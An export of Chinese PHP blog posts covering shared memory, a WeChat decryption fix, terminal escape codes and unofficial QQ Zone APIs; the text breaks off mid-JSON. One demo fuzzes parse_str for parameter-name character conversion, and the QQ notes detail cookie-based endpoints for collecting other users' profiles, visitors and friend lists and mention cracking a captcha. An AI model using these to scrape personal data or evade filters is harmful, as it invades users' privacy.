问题。将数据集直接存储在内存中具有诸多优势，从 Web 服务数据缓存到会话共享。它是一个非常有用的概念，每个 PHP 开发人员都应该知道。 共享内存和 PHPPHP 拥有丰富的可用扩展，共享内存也一样。使用一些共享的函数，无需安装任何扩展，开发人员就能够轻松操作内存段。 创建内存段共享内存函数类似于文件操作函数，但无需处理一个流，您将处理一个共享内存访问 ID。第一个示例就是 shmop_open 函数，它允许您打开一个现有的内存段或创建一个新内存段。此函数非常类似于经典的 fopen 函数，后者打开用于文件操作的流，返回一个资源供其他希望读取或写入该打开的流的函数使用。让我们看看清单 1 中的 shmop_open。 清单 1. shmop_open 函数 1234567891011&lt;?php// $systemid = ftok(__FILE__,'t'); // System ID for the shared memory segment$systemid = 864; // System ID for the shared memory segment$mode = "c"; // Access mode$permissions = 0755; // Permissions for the shared memory segment$size = 1024; // Size, in bytes, of the segment$shmid = shmop_open($systemid, $mode, $permissions, $size);?&gt; 该函数中出现的第一个事物是系统 ID 参数。这是标识系统中的共享内存段的数字。第二个参数是访问模式，它非常类似于 fopen 函数的访问模式。您可以在 4 种不同的模式下访问一个内存段： 模式 “a”，它允许您访问只读内存段 模式 “w”，它允许您访问可读写的内存段 模式 “c”，它创建一个新内存段，或者如果该内存段已存在，尝试打开它进行读写 模式 “n”，它创建一个新内存段，如果该内存段已存在，则会失败 第三个参数是内存段的权限。您必须在这里提供一个八进制值。 第四个参数提供内存段大小，以字节为单位。在写入一个内存段之前，您必须在它之上分配适当的字节数。 请注意，此函数返回一个 ID 编号，其他函数可使用该 ID 编号操作该共享内存段。这个 ID 是共享内存访问 ID，与系统 ID 不同，它以参数的形式传递。请注意不要混淆这两者。如果失败，shmop_open 将返回 FALSE。 向内存段写入数据使用 shmop_write 函数向共享内存块写入数据。此函数的使用很简单，它仅接受 3 个参数，如清单 2 所示。 清单 2. 使用 shmop_write 向共享内存块写入数据 123456&lt;?php$shmid = shmop_open(864, 'c', 0755, 1024);shmop_write($shmid, "Hello World!", 0);?&gt; 这个函数类似于 fwrite 函数，后者有两个参数：打开的流资源（由 fopen 返回）和您希望写入的数据。shmop_write 函数也执行此任务。 第一个参数是 shmop_open 返回的 ID，它识别您操作的共享内存块。第二个参数是您希望存储的数据，最后的第三个参数是您希望开始写入的位置。默认情况下，我们始终使用 0 来表示开始写入的位置。请注意，此函数在失败时会返回 FALSE，在成功时会返回写入的字节数。 从内存段读取数据从共享内存段读取数据很简单。您只需要一个打开的内存段和 shmop_read 函数。此函数接受一些参数，工作原理类似于 fread。参见清单 3，读取一个 PHP 文件的内容。 清单 3. 使用 shmop_read 读取一个文件的内容 1234567&lt;?php$stream = fopen('file.txt', 'r+');fwrite($stream, "Hello World!");echo fread($stream, 11);?&gt; 读取共享内存段的内容的过程与此类似，如清单 4 所示： 清单 4. 读取共享内存段的内容 1234567&lt;?php$shmid = shmop_open(864, 'c', 0755, 1024);shmop_write($shmid, "Hello World!", 0);echo shmop_read($shmid, 0, 11);?&gt; 请留意这里的参数。shmop_read 函数将接受 shmop_open 返回的 ID，我们已知道它，不过它还接受另外两个参数。第二个参数是您希望从内存段读取的位置，而第三个是您希望读取的字节数。第二个参数可以始终为 0，表示数据的开头，但第三个参数可能存在问题，因为我们不知道我们希望读取多少字节。 这非常类似于我们在 fread 函数中的行为，该函数接受两个参数：打开的流资源（由 fopen 返回）和您希望从该流读取的字节数。使用 filesize 函数（它返回一个文件中的字节数）来完整地读取它。 幸运的是，当使用共享内存段时，shmop_size 函数返回一个内存段的大小（以字节为单位），类似于 filesize 函数。参见清单 5。 清单 5. shmop_size 函数返回内存段大小，以字节为单位 123456789&lt;?php$shmid = shmop_open(864, 'c', 0755, 1024);shmop_write($shmid, "Hello World!", 0);$size = shmop_size($shmid);echo shmop_read($shmid, 0, $size);?&gt; 删除内存段我们学习了如何打开、写入和读取共享内存段。要完成我们的 CRUD 类，我们还需要学习如何删除内存段。该任务可使用 shmop_delete 函数轻松完成，该函数仅接受一个参数：我们希望删除的共享内存 ID。 清单 6. shmop_delete 标记要删除的内存段 1234567&lt;?php$shmid = shmop_open(864, 'c', 0755, 1024);shmop_write($shmid, "Hello World!", 0);shmop_delete($shmid);?&gt; 这不会实际删除该内存段： 它将该内存段标记为删除，因为共享内存段在有其他进程正在使用它时无法被删除。shmop_delete 函数将该内存段标记为删除，阻止任何其他进程打开它。要删除它，我们需要关闭该内存段。 关闭内存段打开一个共享内存段会 “附加” 到它。附加该内存段之后，我们可在其中进行读取和写入，但完成操作后，我们必须从它解除。这使用清单 7 中的 shmop_close 函数来完成。 这非常类似于处理文件时的 fclose 函数。打开包含一个文件的流并在其中读取或写入数据后，我们必须关闭它，否则将发生锁定。 清单 7. 使用 shmop_close 与一个内存段分开 12345678&lt;?php$shmid = shmop_open(864, 'c', 0755, 1024);shmop_write($shmid, "Hello World!", 0);shmop_delete($shmid);shmop_close($shmid);?&gt; 使用共享内存作为一个存储选项有了共享内存和共享内存段上基本 CRUD 操作的基本知识，是时候应用此知识了。我们可以使用共享内存作为一种独特的存储选项，提供快速读/写操作和进程互操作性等优势。对于 Web 应用程序，这意味着： 缓存存储（数据库查询、Web 服务数据、外部数据） 会话存储 应用程序之间的数据交换 在继续之前，我想介绍一个名为 SimpleSHM 小型库。SimpleSHM 是一个较小的抽象层，用于使用 PHP 操作共享内存，支持以一种面向对象的方式轻松操作内存段。在编写使用共享内存进行存储的小型应用程序时，这个库可帮助创建非常简洁的代码。要了解 SimpleSHM，请访问 GitHub 页面。 您可以使用 3 个方法进行处理：读、写和删除。从该类中简单地实例化一个对象，可以控制打开的共享内存段。清单 8 展示了基本用途。 清单 8. SimpleSHM 基本用途 1234567&lt;?php$memory = new SimpleSHM;$memory-&gt;write('Sample');echo $memory-&gt;read();?&gt; 请注意，这里没有为该类传递一个 ID。如果没有传递 ID，它将随机选择一个编号并打开该编号的新内存段。我们可以以参数的形式传递一个编号，供构造函数打开现有的内存段，或者创建一个具有特定 ID 的内存段，如清单 9 所示。 清单 9. 打开一个特定的内存段 1234567&lt;?php$new = new SimpleSHM(897);$new-&gt;write('Sample');echo $new-&gt;read();?&gt; __destructor 负责在该内存段上调用 shmop_close 来取消设置对象，以与该内存段分离。我们将这称为 “SimpleSHM 101”。现在让我们将此方法用于更高级的用途：使用共享内存作为存储。存储数据集需要序列化，因为数组或对象无法存储在内存中。尽管这里使用了 JSON 来序列化，但任何其他方法（比如 XML 或内置的 PHP 序列化功能）也已足够。清单 10 给出了一个示例。 清单 10. 使用共享内存作为存储 12345678910111213141516171819&lt;?phprequire('SimpleSHM.class.php');$results = array( 'user' =&gt; 'John', 'password' =&gt; '123456', 'posts' =&gt; array('My name is John', 'My name is not John'));$data = json_encode($results);$memory = new SimpleSHM;$memory-&gt;write($data);$storedarray = json_decode($memory-&gt;read());print_r($storedarray);?&gt; 我们成功地将一个数组序列化为一个 JSON 字符串，将它存储在共享内存块中，从中读取数据，去序列化 JSON 字符串，并显示存储的数组。这看起来很简单，但请想象一下这个代码片段带来的可能性。您可以使用它存储 Web 服务请求、数据库查询或者甚至模板引擎缓存的结果。在内存中读取和写入将带来比在磁盘中读取和写入更高的性能。 使用此存储技术不仅对缓存有用，也对应用程序之间的数据交换也有用，只要数据以两端都可读的格式存储。不要低估共享内存在 Web 应用程序中的力量。可采用许多不同的方式来巧妙地实现这种存储，惟一的限制是开发人员的创造力和技能。 结束语本文介绍了用于操作共享内存段的 PHP 工具包中的大部分工具，解释了共享内存的工作原理。此外，还提供了改进 Web 应用程序的建议，列出了在为 Web 应用程序问题创建解决方案时要考虑的一些因素。这些概念和实现指南可帮助您建立一个起点。我们构建的早期模型可帮助您构想更复杂的特性和解决方案。 未来计划我们列出了共享内存中最可能实现的一些常见问题，比如缓存、会话共享和应用程序之间的常见数据交换。此篇共享内存简介为您就常见问题而探索更佳解决方案提供机会。您可以自由扩展当前的 SimpleSHM 实现，以匹配您的需要和将更改贡献给该项目。 注意：windows环境下，上面清单方法需要在php_shmop.dll开启的环境下才可运行。其中ftok方法实现: 12345678910111213// 将路径名和项目标识符转换为System V IPC 密钥if (!function_exists('ftok')) &#123; function ftok($filename = "", $proj = "") &#123; if (empty($filename) || !file_exists($filename)) &#123; return -1; &#125; else &#123; $filename = $filename . (string)$proj; for ($key = array(); sizeof($key) &lt; strlen($filename); $key[] = ord(substr($filename, sizeof($key), 1))) ; return dechex(array_sum($key)); &#125; &#125;&#125;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[微信小程序敏感信息解密代码中Mcrypt被PHP7.1废弃的解决方案]]></title>
    <url>%2Farticles%2F%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E4%B8%ADMcrypt%E8%A2%ABPHP7-1%E5%BA%9F%E5%BC%83%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[一、问题微信小程序开发的加解密demo代码中，使用了 Mcrypt ，而mcrypt在php7.1已经算是被废弃了。强制使用将会出现如下问题: 1234&#123; "message":"Function mcrypt_module_open() is deprecated", "status_code":500&#125; 二、解决主要是在 Prpcrypt 这个类里面中使用的代码 之前的代码： 12345678910111213141516171819202122/** * 对密文进行解密 * @param string $aesCipher 需要解密的密文 * @param string $aesIV 解密的初始向量 * @return array 解密得到的明文*/public function decrypt($aesCipher, $aesIV)&#123; try &#123; $module = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');// 此处php &lt; 7.1 支持 mcrypt_generic_init($module, $this-&gt;key, $aesIV); //解密 $decrypted = mdecrypt_generic($module, $aesCipher); mcrypt_generic_deinit($module); mcrypt_module_close($module); &#125; catch (Exception $e) &#123; return array(ErrorCode::$IllegalBuffer, null); &#125;&#125; 修改之后的代码： 123456789101112131415161718192021222324/*** 对密文进行解密* @param string $aesCipher 需要解密的密文* @param string $aesIV 解密的初始向量* @return array 解密得到的明文*/public function decrypt($aesCipher, $aesIV)&#123; try &#123; //解密 $decrypted = openssl_decrypt($aesCipher, 'aes-128-cbc', $this-&gt;key, OPENSSL_RAW_DATA, $aesIV); &#125; catch (\Exception $e) &#123; return [ErrorCode::$IllegalBuffer, null]; &#125; try &#123; //去除补位字符 $pkc_encoder = new PKCS7Encoder; $result = $pkc_encoder-&gt;decode($decrypted); &#125; catch (\Exception $e) &#123; return [ErrorCode::$IllegalBuffer, null]; &#125; return [0, $result];&#125; 三、注意需要安装openssl扩展！！ 四、DEMO123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187&lt;?phpnamespace App\Extend;class WxDataDecrypt&#123; private $appid; private $sessionKey; /** * 构造函数 * @param $sessionKey string 用户在小程序登录后获取的会话密钥 * @param $appId string 小程序的appId */ public function __construct($appid, $sessionKey) &#123; $this-&gt;sessionKey = $sessionKey; $this-&gt;appid = $appid; &#125; /** * 检验数据的真实性，并且获取解密后的明文. * @param $encryptedData string 加密的用户数据 * @param $iv string 与用户数据一同返回的初始向量 * @param $data string 解密后的原文 * * @return int 成功0，失败返回对应的错误码 */ public function decryptData($encryptedData, $iv, &amp;$data) &#123; if (strlen($this-&gt;sessionKey) != 24) &#123; return ErrorCode::$IllegalAesKey; &#125; $aesKey = base64_decode($this-&gt;sessionKey); if (strlen($iv) != 24) &#123; return ErrorCode::$IllegalIv; &#125; $aesIV = base64_decode($iv); $aesCipher = base64_decode($encryptedData); $pc = new Prpcrypt($aesKey); $result = $pc-&gt;decrypt($aesCipher, $aesIV); if ($result[0] != 0) &#123; return $result[0]; &#125; $dataObj = json_decode($result[1]); if ($dataObj == NULL) &#123; return ErrorCode::$IllegalBuffer; &#125; if ($dataObj-&gt;watermark-&gt;appid != $this-&gt;appid) &#123; return ErrorCode::$IllegalBuffer; &#125; $data = $result[1]; return ErrorCode::$OK; &#125;&#125;/** * PKCS7Encoder class * * 提供基于PKCS7算法的加解密接口. */class PKCS7Encoder&#123; public static $block_size = 32; /** * 对需要加密的明文进行填充补位 * @param string $text 需要进行填充补位操作的明文 * @return string 补齐明文字符串 */ function encode($text) &#123; $block_size = self::$block_size; $text_length = strlen($text); //计算需要填充的位数 $amount_to_pad = $block_size - ($text_length % $block_size); if ($amount_to_pad == 0) $amount_to_pad = $block_size; //获得补位所用的字符 $pad_chr = chr($amount_to_pad); $tmp = ""; for ($index = 0; $index &lt; $amount_to_pad; $index++) $tmp .= $pad_chr; return $text . $tmp; &#125; /** * 对解密后的明文进行补位删除 * @param string $text 解密后的明文 * @return string 删除填充补位后的明文 */ function decode($text) &#123; $pad = ord(substr($text, -1)); if ($pad &lt; 1 || $pad &gt; self::$block_size) $pad = 0; return substr($text, 0, (strlen($text) - $pad)); &#125;&#125;/** * Prpcrypt class * * */class Prpcrypt&#123; public $key; function __construct($key) &#123; $this-&gt;key = $key; &#125; /** * 对密文进行解密 * @param string $aesCipher 需要解密的密文 * @param string $aesIV 解密的初始向量 * @return array 解密得到的明文 */ public function decrypt($aesCipher, $aesIV) &#123; try &#123; //解密 $decrypted = openssl_decrypt($aesCipher, 'aes-128-cbc', $this-&gt;key, OPENSSL_RAW_DATA, $aesIV); &#125; catch (\Exception $e) &#123; return [ErrorCode::$IllegalBuffer, null]; &#125; try &#123; //去除补位字符 $pkc_encoder = new PKCS7Encoder; $result = $pkc_encoder-&gt;decode($decrypted); &#125; catch (\Exception $e) &#123; return [ErrorCode::$IllegalBuffer, null]; &#125; return [0, $result]; &#125;&#125;/** * error code 说明. * &lt;ul&gt; * &lt;li&gt;-41001: encodingAesKey 非法&lt;/li&gt; * &lt;li&gt;-41003: aes 解密失败&lt;/li&gt; * &lt;li&gt;-41004: 解密后得到的buffer非法&lt;/li&gt; * &lt;li&gt;-41005: base64加密失败&lt;/li&gt; * &lt;li&gt;-41016: base64解密失败&lt;/li&gt; * &lt;/ul&gt; */class ErrorCode&#123; public static $OK = 0; public static $IllegalAesKey = -41001; public static $IllegalIv = -41002; public static $IllegalBuffer = -41003; public static $DecodeBase64Error = -41004; public static $DecryptAESError = -41005; public static $ValidateAppidError = -41006; public static $ErrorMsg = [ 0 =&gt; 'ok', -41001 =&gt; 'aes 解密失败', -41002 =&gt; '解密后得到的buffer非法', -41003 =&gt; 'base64加密失败', -41004 =&gt; 'base64解密失败' ];&#125;// 获取手机号$tool = new WxDataDecrypt(ENV('WX_APPID'), $arr['_session_key']);$error = $tool-&gt;decryptData($arr['encryptedData'], $arr['iv'], $decryptRet);if ($error) &#123; echo ErrorCode::$ErrorMsg[$error] ?? '未知错误';&#125; else &#123; $decryptRet = json_decode($decryptRet, true); $tel_phone = $decryptRet['purePhoneNumber']; echo "phone: &#123;$tel_phone&#125;";&#125;?&gt; 五、简化上面的代码比较复杂，那就看下面的代码吧, 调用方法完全一致。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpclass WxDataDecrypt&#123; private $appid; private $sessionKey; /** * error code 说明. * &lt;ul&gt; * &lt;li&gt;-41001: encodingAesKey 非法&lt;/li&gt; * &lt;li&gt;-41003: aes 解密失败&lt;/li&gt; * &lt;li&gt;-41004: 解密后得到的buffer非法&lt;/li&gt; * &lt;li&gt;-41005: base64加密失败&lt;/li&gt; * &lt;li&gt;-41016: base64解密失败&lt;/li&gt; * &lt;/ul&gt; */ public static $OK = 0; public static $IllegalAesKey = -41001; public static $IllegalIv = -41002; public static $IllegalBuffer = -41003; public static $DecodeBase64Error = -41004; public static $ErrorMsg = [ 0 =&gt; 'ok', -41001 =&gt; 'aes 解密失败', -41002 =&gt; '解密后得到的buffer非法', -41003 =&gt; 'base64加密失败', -41004 =&gt; 'base64解密失败' ]; /** * 构造函数 * @param $sessionKey string 用户在小程序登录后获取的会话密钥 * @param $appid string 小程序的appid */ public function __construct($appid, $sessionKey) &#123; $this-&gt;appid = $appid; $this-&gt;sessionKey = $sessionKey; &#125; /** * 检验数据的真实性，并且获取解密后的明文. * @param $encryptedData string 加密的用户数据 * @param $iv string 与用户数据一同返回的初始向量 * @param $data string 解密后的原文 * * @return int 成功0，失败返回对应的错误码 */ public function decryptData($encryptedData, $iv, &amp;$data) &#123; if (strlen($this-&gt;sessionKey) != 24) &#123; return self::$IllegalAesKey; &#125; $aesKey = base64_decode($this-&gt;sessionKey); if (strlen($iv) != 24) &#123; return self::$IllegalIv; &#125; $aesIV = base64_decode($iv); $aesCipher = base64_decode($encryptedData); $result = openssl_decrypt($aesCipher, "AES-128-CBC", $aesKey, OPENSSL_RAW_DATA, $aesIV); $dataObj = json_decode($result); if ($dataObj == NULL) &#123; return self::$IllegalBuffer; &#125; if ($dataObj-&gt;watermark-&gt;appid != $this-&gt;appid) &#123; return self::$IllegalBuffer; &#125; $data = $result; return self::$OK; &#125;&#125;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>微信开发</tag>
        <tag>小程序</tag>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[超级终端玩法]]></title>
    <url>%2Farticles%2F%E8%B6%85%E7%BA%A7%E7%BB%88%E7%AB%AF%E7%8E%A9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[颜色特效控制： 1printf(&quot;\033[1;33m Hello World. \033[0m \n&quot;); 颜色如下: 123456789101112131415161718192021222324252627282930313233none = &quot;\033[0m&quot;black = &quot;\033[0;30m&quot;dark_gray = &quot;\033[1;30m&quot;blue = &quot;\033[0;34m&quot;light_blue = &quot;\033[1;34m&quot;green = &quot;\033[0;32m&quot;light_green -= &quot;\033[1;32m&quot;cyan = &quot;\033[0;36m&quot;light_cyan = &quot;\033[1;36m&quot;red = &quot;\033[0;31m&quot;light_red = &quot;\033[1;31m&quot;purple = &quot;\033[0;35m&quot;light_purple = &quot;\033[1;35m&quot;brown = &quot;\033[0;33m&quot;yellow = &quot;\033[1;33m&quot;light_gray = &quot;\033[0;37m&quot;white = &quot;\033[1;37m&quot; 字背景颜色范围: 123456789101112131415161740--49 字颜色: 30--3940: 黑 30: 黑41:红 31: 红42:绿 32: 绿43:黄 33: 黄44:蓝 34: 蓝45:紫 35: 紫46:深绿 36: 深绿47:白色 37: 白色 输出特效格式控制： 123456789101112131415\033[0m 关闭所有属性\033[1m 设置高亮度\03[4m 下划线\033[5m 闪烁\033[7m 反显\033[8m 消隐\033[30m -- \033[37m 设置前景色\033[40m -- \033[47m 设置背景色 光标位置等的格式控制： 123456789101112131415161718192021\033[nA 光标上移n行\03[nB 光标下移n行\033[nC 光标右移n行\033[nD 光标左移n行\033[y;xH设置光标位置\033[2J 清屏\033[K 清除从光标到行尾的内容\033[s 保存光标位置\033[u 恢复光标位置\033[?25l 隐藏光标\33[?25h 显示光标 DEMO 123456789101112131415&lt;?phpforeach (["&#123;chr&#125;foo_bar", "foo&#123;chr&#125;bar", "foo_bar&#123;chr&#125;"] as $k =&gt; $arg) &#123; for ($i = 0; $i &lt;= 255; $i++) &#123; echo "\33[999D\33[K\r"; echo "[" . $arg . "] check " . bin2hex(chr($i)) . ""; parse_str(str_replace("&#123;chr&#125;", chr($i), $arg) . "=bla", $o); usleep(5000); if (isset($o["foo_bar"])) &#123; echo "\33[999D\33[K\r"; echo $arg . " -&gt; " . bin2hex(chr($i)) . " (" . chr($i) . ")\n"; &#125; &#125; echo "\33[999D\33[K\r"; echo "\n";&#125;]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QQ空间Api]]></title>
    <url>%2Farticles%2FQQ%E7%A9%BA%E9%97%B4Api%2F</url>
    <content type="text"><![CDATA[登录 扫码登录下面接口均在PC环境下测试获取，故建议Header里面指定如下 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 获取登录二维码 https://ssl.ptlogin2.qq.com/ptqrshow?appid=549000912&amp;e=2&amp;l=M&amp;s=3&amp;d=72&amp;v=4&amp;t=0.635 (GET) 该接口返回一张二维码，在返回cookie中可以获取到qrsig, qrsig值用于检测二维码是否被扫，有点key的作用。 可以通过改变e值控制二维码留白的宽度，改变v值控制二维码的大小 检测当前二维码状态 https://ssl.ptlogin2.qq.com/ptqrlogin?u1=https%3A%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;from_ui=1&amp;ptqrtoken=2009382067&amp;aid=549000912 (GET) 参数 ptqrtoken(参考见ptqrtoken生成算法), aid(就是第一步的appid), from_ui=1(必须), Cookie中需要第一步获取的qrsig, 返回结果： 12345 // `65`: QRCode 失效 // `0` : 验证成功（返回参数中(第3个)包含一个URL，请求这个URL可以得到Cookie） // `66`: 未失效 // `67`: 验证中 ptuiCB('66','0','','0','二维码未失效。(2717929012)', '') 这个接口需要轮询，因为扫码这个操作是异步的，而且每个二维码都是有失效的，直到返回码为0 或 65 结束轮询。 获取p_skey，完成用户登录 第2步中，如果ptuiCB(‘0’,’0’,URL,’0’,’登录成功’, ‘QQ昵称’), 该函数第三个参数会返回一个跳转连接，访问这个跳转连接可以在返回的Cookie中获取得到skey,p_skey以及uin和p_uin,登录才算完成。 账号密码登录 当前卡在破解拖曳验证环节，正在努力探索，敬请期待… 数据采集 API接口下面接口均在H5环境下测试获取，故建议Header里面指定如下 12345User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1Cookie: uin=o0QQ号码; skey=@xxx; p_uin=o0QQ号码; p_skey=xxxx // cookie中的参数在登录时候取得, 注意每个 ';' 后面有且仅有一个空格 接口均需要带上 g_tk 参数辨明当前用户身份, g_tk是根据p_skey算出来的，可参考算法传送. 接口中 fotmat=json表示返回json格式，同时支持 json=html,但是返回JSONP,例如查看访客记录会返回如下: 1234567_Callback(&#123; "code":0, "subcode":0, "message":"", "default":0, "data": &#123;"count":0,"lastgettime":1589267763,"page":2,"todaycount":0,"totalcount":602,"totalpage":2,"twlogincounts":0&#125;&#125;); 注意的是 下面的所有接口均允许查看非当前用户信息的，但是需要对方允许你查看，否则会返回如下： 12345678910111213141516171819&#123; "code":-4009, "subcode":-100004009, "message":"空间主人设置了访问权限，您无法进行操作", "notice":0, "time":1589266766, "tips":"A673-153"&#125;或者&#123; "code":-4403, "subcode":-100004403, "message":"无操作权限", "notice":0, "time":1589268589, "tips":"6070-866"&#125; 接口添加format参数可以返回指定数据格式: 默认是jsonp，同时支持 json,xml 获取用户信息 https://mobile.qzone.qq.com/profile_get?g_tk=见ptqrtoken生成算法&amp;format=json&amp;hostuin=123456 (GET) hostuin 是要查询的用户QQ, 可以是自己的也可以是别人的。返回如下: 1234567891011121314151617181920212223242526272829// 成功返回&#123; "code":0, "subcode":0, "message":"", "default":0, "data":&#123; "age":12, "birthday":21, "birthmonth":1, "birthyear":2007, "city":"成都", "cityid":"1", "constellation":"水瓶座", "country":"中国", "countryid":"1", "face":"http://qlogo4.store.qq.com/qzone/QQ号码/QQ号码/100", "gender":1, "isBrandQzone":0, "islunar":0, "limitsMask":31, "nickname":"0x5f3759df", "province":"四川", "provinceid":"51", // 查询自己的信息时才会有下面的字段 "vip":0, "viplevel":1 &#125;&#125; 获取用户全部信息 https://h5.qzone.qq.com/proxy/domain/base.qzone.qq.com/cgi-bin/user/cgi_userinfo_get_all?uin=目标QQ&amp;vuin=当前用户QQ&amp;g_tk=见ptqrtoken生成算法&amp;format=json uin目标QQ，但是需要对方允许你访问。返回如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&#123; "code": 0, "subcode": 0, "message": "获取成功", "default": 0, "data": &#123; "uin": QQ, "is_famous": false, "famous_custom_homepage": false, "nickname": "Mr.Gou", "emoji": [], "spacename": "Mr.Gou", "desc": "六年风雨生长只为两日花开. ", "signature": "", "avatar": "", "sex_type": 0, "sex": 1, "animalsign_type": 0, "constellation_type": 0, "constellation": 7, "age_type": 0, "age": 4, "islunar": 0, "birthday_type": 0, "birthyear": 2016, "birthday": "11-01", "bloodtype": 2, "address_type": 0, "country": "中国", "province": "四川", "city": "成都", "home_type": 0, "hco": "", "hp": "", "hc": "", "marriage": 3, "career": "", "company": "", "cco": "", "cp": "", "cc": "", "cb": "", "mailname": "", "mailcellphone": "", "mailaddr": "", "qzworkexp": [], "qzeduexp": [], "ptimestamp": 0 &#125;&#125; 获取访客 https://mobile.qzone.qq.com/mqz_get_visitor?g_tk=见ptqrtoken生成算法&amp;res_mode=0&amp;res_uin=QQ号码&amp;offset=0&amp;count=10&amp;page=1&amp;format=json&amp;t=1589267183290 (GET) res_uin参数为需要查看的QQ号码，page是页码,res_mode访问方式: 0表示谁访问我，1表示我访问过谁（这个需要权限，不允许查看别人访问了谁）, 2表示获取最近联系人 12345678910111213141516171819202122232425262728&#123; "code": 0, "subcode": 0, "message": "", "default": 0, "data": &#123; "count": 20, "lastgettime": 1589267182, "list": [ &#123; "face_url": "http://qlogo4.store.qq.com/qzone/QQ号码/QQ号码/50",// 用户头像 "info": "查看日志《HTTP的请求头标签 If-Modified-Since》", // 查看内容 "nick": "-",// 昵称 "platform_src": 0, "service_src": 2, "source": 2, "time": 1587610771,// 访问时间 "uin": QQ号码 // 访客QQ号码 &#125; ... ], "page": 1, "todaycount": 0, // 今日浏览量 "totalcount": 602, // 历史浏览量 "totalpage": 2, // 总共可查看页码 "twlogincounts": 0 &#125;&#125; 获取好友列表 https://mobile.qzone.qq.com/friend/mfriend_list?g_tk=见ptqrtoken生成算法&amp;res_uin=QQ号码&amp;res_type=normal&amp;format=json&amp;count_per_page=10&amp;page_index=0&amp;page_type=0&amp;mayknowuin=&amp;qqmailstat= res_uin参数此处是无效， res_type有两种模式 normal和care,前者表示我全部的好友，后者表示我关心的好友 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// 我的好友列表 ( res_type=normal )&#123; "code": 0, "subcode": 0, "message": "", "default": 0, "data": &#123; "gpnames": [ // 好友分组 &#123; "gpid": 0, // 组ID "gpname": "我的好友" // 组名 &#125; ], "list": [ // 我的好友(全部) &#123; "groupid": 0, // 好友分组ID "isvip": 1, // 是否是vip "nick": "babyQ", // 昵称 "remark": "babyQ", // 备注 "searchField": "66600000 babyQ babyQ ",// 搜索词 "uin": 66600000, // QQ号码 "viplevel": 9 // vip级别 &#125; ... ], "mayknow": &#123; // 我可能认识的好友(每次请求可能都不同) "allnum": 10, "list": [ &#123; "nick": "xxxxx", // 备注昵称 "profile_url": "http://qlogo2.store.qq.com/qzone/QQ号码/QQ号码/100",// 好友头像 "reason": "", "uin": QQ号码 // 好友QQ号码 &#125; ], "page": 1 &#125;, "speciallist": null &#125;&#125;// 特别关注的好友 ( res_type=care )&#123; "code":0, "subcode":0, "message":"", "default":0, "data":&#123; "list":[// 特别关注的好友 &#123; "nick":"xxxx",// 昵称 "uin":好友QQ号码// QQ号码 &#125; ], "recommendlist":&#123; // 推荐我关注的好友 "list":[ &#123; "nick":"xxxx", "uin":"好友QQ号码" &#125; ] &#125; &#125;&#125; 获取照片、日志、说说、留言列表这几个是同一个接口，参数不同而已 https://mobile.qzone.qq.com/list?g_tk=1190425035&amp;format=json&amp;list_type=album&amp;action=0&amp;res_uin=QQ号码&amp;count=10 (GET) count(页面大小), list_type：( blog=日志,shuoshuo=说说,msg=留言,album=相册) , res_attach= “att=offset%3D0%26tl=时间戳” 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201&#123; "code": 0, "subcode": 0, "message": "", "default": 0, "data": &#123; "attach_info": "att=offset%3D1&amp;tl=1518835499",// 分页信息 "auto_load": 0, "has_more": 1,// 是否还有数据 "remain_count": 1179,// 还有多少数据 "vFeeds": [ &#123; "cell_template": &#123; "id": "" &#125;, "comm": &#123; "actiontype": 0, "actionurl": "", "appid": 311, "curlikekey": "http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00", "feedskey": "d3498a1f2b97875ae9370b00", "feedstype": 0, "operatemask": 517131, "orglikekey": "http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00", "originaltype": 0, "refer": "", "subid": 0, "time": 1518835499 &#125;, "comment": &#123; // 评论 "cntnum": 2,// 数据条数 "comments": [ &#123; "audio": null, "commentid": "1", "commentpic": &#123; "pic": null &#125;, "content": "知道啦[em]e104[/em][em]e104[/em][em]e104[/em]", "date": 1518836256, "picdata": &#123; "pic": null &#125;, "refer": "", "replynum": 0, "replys": null, "user": &#123; "from": 1, "is_owner": 0, "level": 0, "logo": "", "nickname": "xxxx", "stuStarInfo": &#123; "iStarLevel": 0, "iStarStatus": 0, "isAnnualVip": 0 &#125;, "uin": "好友QQ号码", "vip": 0 &#125; &#125; ... ], "main_comment": null, "num": 2 &#125;, "id": &#123; "cellid": "d3498a1f2b97875ae9370b00", // 该篇内容的ID "subid": "" &#125;, "like": &#123; // 点赞 "isliked": 0, "likemans": [ &#123; "refer": "", "user": &#123; "from": 1, "is_owner": 0, "level": 0, 